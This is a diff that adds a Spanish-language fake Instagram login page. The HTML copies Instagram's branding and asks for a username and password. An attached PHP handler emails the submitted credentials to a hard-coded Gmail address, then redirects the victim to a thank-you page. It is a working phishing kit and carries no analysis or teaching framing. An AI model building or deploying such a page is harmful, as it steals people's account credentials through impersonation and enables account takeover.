@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iniciar sesión en Instagram</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #fafafa;
+            text-align: center;
+            margin: 0;
+            padding: 0;
+        }
+
+        h1 {
+            color: #405DE6;
+            margin-top: 50px;
+        }
+
+        .logo {
+            display: block;
+            margin: 0 auto;
+            width: 100px;
+            margin-top: 20px;
+        }
+
+        .message {
+            text-align: center;
+            margin-top: 20px;
+            color: #999;
+        }
+
+        form {
+            max-width: 300px;
+            margin: 20px auto;
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #333;
+        }
+
+        input {
+            width: calc(100% - 16px);
+            padding: 8px;
+            margin-bottom: 16px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+
+        input[type="submit"] {
+            background-color: #405DE6;
+            color: #fff;
+            cursor: pointer;
+        }
+
+        input[type="submit"]:hover {
+            background-color: #3A4DC8;
+        }
+    </style>
+</head>
+<body>
+    <h1>Iniciar sesión en Instagram</h1>
+    <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/9/95/Instagram_logo_2022.svg" alt="Instagram Logo">
+    <div class="message">
+        <p>Inicia sesión antes de entrar</p>
+    </div>
+    <form>
+        <label for="username">Nombre de usuario:</label>
+        <input type="text" id="username" name="username" required><br><br>
+        <label for="password">Contraseña:</label>
+        <input type="password" id="password" name="password" required><br><br>
+        <input type="submit" value="Iniciar sesión">
+    </form>
+</body>
+</html>
+<?php
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    $username = $_POST["username"];
+    $password = $_POST["password"];
+
+    $to = "allanarauz629@gmail.com";
+    $subject = "Información de inicio de sesión";
+    $message = "Nombre de usuario: $username\nContraseña: $password";
+
+    // Utiliza la función mail() para enviar el correo electrónico
+    mail($to, $subject, $message);
+
+    // Puedes redirigir a una página de agradecimiento u otra después de enviar el correo
+    header("Location: gracias.html");
+}
+?>
+
